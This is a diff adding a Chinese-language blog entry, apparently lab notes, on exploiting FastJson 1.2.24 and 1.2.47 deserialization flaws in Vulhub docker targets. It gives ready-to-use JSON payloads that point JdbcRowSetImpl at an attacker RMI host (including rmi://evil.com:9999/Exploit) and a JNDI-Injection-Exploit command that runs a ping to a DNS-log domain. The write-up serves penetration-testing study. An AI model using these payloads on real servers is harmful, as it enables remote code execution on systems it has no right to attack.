@@ -2357,4 +2357,49 @@ st->op1->op2->op3->op4->e</textarea><textarea id="flowchart-0-options" style="di
         <tag>PHP</tag>
       </tags>
   </entry>
+  <entry>
+    <title>FastJson RCE实验笔记</title>
+    <url>/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
+<h3 id="FastJson-1-2-24"><a href="#FastJson-1-2-24" class="headerlink" title="FastJson 1.2.24"></a>FastJson 1.2.24</h3><h4 id="实验说明"><a href="#实验说明" class="headerlink" title="实验说明"></a>实验说明</h4><p>本次实验使用了<code>Vulhub</code>的<code>fastjson 1.2.24 反序列化导致任意命令执行漏洞</code>，漏洞利用使用了<code>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code>，漏洞地址为<code>http://192.168.154.130:8090</code>。</p>
+<h4 id="启动漏洞环境"><a href="#启动漏洞环境" class="headerlink" title="启动漏洞环境"></a>启动漏洞环境</h4><p>因为用了docker的漏洞环境，所以请先安装<code>docker</code>及<code>docker-compose</code>，此处不再赘述。在靶机运行命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br><span class="line"><span class="built_in">cd</span> vulhub/fastjson/1.2.24-rce/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-10-51-27.png"><br>启动后可访问FastJson的服务：<br><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-10-52-07.png"></p>
+<a id="more"></a>
+<h4 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h4><p>这里使用了burpsuite的BurpFastJsonScan插件：<a href="https://github.com/pmiaowu/BurpFastJsonScan%E3%80%82">https://github.com/pmiaowu/BurpFastJsonScan。</a><br>经过扫描可以看到存在漏洞：<br><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-10-56-47.png"></p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>首先要启动一个<code>RMI</code>或者<code>LDAP</code>服务，我这里使用的是<code>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code>，相对<code>marshalsec</code>来说它的操作步骤要少一些。</p>
+<p><strong><code>JNDI-Injection-Exploit</code>的官方说明如下：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]</span><br><span class="line"></span><br><span class="line">-C - 远程class文件中要执行的命令。</span><br><span class="line"></span><br><span class="line">（可选项 , 默认命令是mac下打开计算器，即&quot;open &#x2F;Applications&#x2F;Calculator.app&quot;）</span><br><span class="line"></span><br><span class="line">-A - 服务器地址，可以是IP地址或者域名。</span><br><span class="line"></span><br><span class="line">（可选项 , 默认地址是第一个网卡地址）</span><br></pre></td></tr></table></figure>
+<p>为了方便和安全起见，我使用了<code>docker</code>来启动它。先把<code>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code>下载到<code>/root/tools/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code>，在vps上启动命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -itd  --rm -p 8180:8180 -p 1099:1099 -p 1389:1389 -v /root/tools/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar:/root/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar java java -jar /root/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;ping jndi.265orc.dnslog.cn&quot;</span> -A 1xx.xx.xx.xx6</span><br></pre></td></tr></table></figure>
+<p>然后通过<code>docker logs</code>命令查询容器输出日志，这里的<code>13</code>是容器的id，在上条命令执行完毕后会输出：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker logs 13</span><br></pre></td></tr></table></figure>
+<p><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-09-57.png"></p>
+<p>在burp抓包后放入poc</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://1xx.xx.xx.xx6:1099/07l8x5&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-13-15.png"></p>
+<p>dnslog中可以看到命令执行成功<br><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-14-47.png"></p>
+<p>ldap协议的利用方式也是相同：<br><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-21-45.png"></p>
+<h3 id="FastJson-1-2-47"><a href="#FastJson-1-2-47" class="headerlink" title="FastJson 1.2.47"></a>FastJson 1.2.47</h3><h4 id="启动漏洞环境-1"><a href="#启动漏洞环境-1" class="headerlink" title="启动漏洞环境"></a>启动漏洞环境</h4><p><code>FastJson 1.2.47</code>的漏洞环境<code>Vulhub</code>也有，所以步骤相似：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ../1.2.247-rce/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-39-21.png"></p>
+<h4 id="漏洞扫描-1"><a href="#漏洞扫描-1" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h4><p>同样是使用BurpFastJsonScan插件扫描，这次插件却在一开始并没有扫出来，需要手动POST一个json包后才开始了扫描，可能跟插件工作逻辑有关。<br><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-50-43.png"></p>
+<p><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-52-16.png"></p>
+<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>漏洞利用还是使用上一节用到的<code>JNDI-Injection-Exploit</code>，exp如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://evil.com:9999/Exploit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-12-01-02.png"><br>因为在上一节的测试中发现<code>dnslog.cn</code>生成的随机域名有效期比较短，容易导致明明命令执行了却看不到dnslog的问题，所以改用了<code>ceye.io</code>测试，可以看到靶机curl请求了<code>ceye.io</code>的http服务：<br><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-12-01-35.png"></p>
+<h3 id="fastjson-lt-1-2-47"><a href="#fastjson-lt-1-2-47" class="headerlink" title="fastjson&lt;=1.2.47"></a>fastjson&lt;=1.2.47</h3><p>对版本小于1.2.48的版本通杀，autoType为关闭状态也可用。方法同上，直接打了：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line"> <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>, </span><br><span class="line"> <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line"> &#125;, </span><br><span class="line"> <span class="string">&quot;b&quot;</span>: &#123;</span><br><span class="line"> <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, </span><br><span class="line"> <span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;rmi://evil.com:9999/Exploit&quot;</span>, </span><br><span class="line"> <span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-13-53-08.png"><br><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-13-53-33.png"></p>
+<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>其它几个fastjson版本的exp需要autoTypeSupport属性为true才能使用，而fastjson&gt;=1.2.25默认为false，相对碰到的情况应该比较少，不一一尝试。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.freebuf.com/articles/web/283585.html">https://www.freebuf.com/articles/web/283585.html</a></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>WEB</tag>
+      </tags>
+  </entry>
 </search>
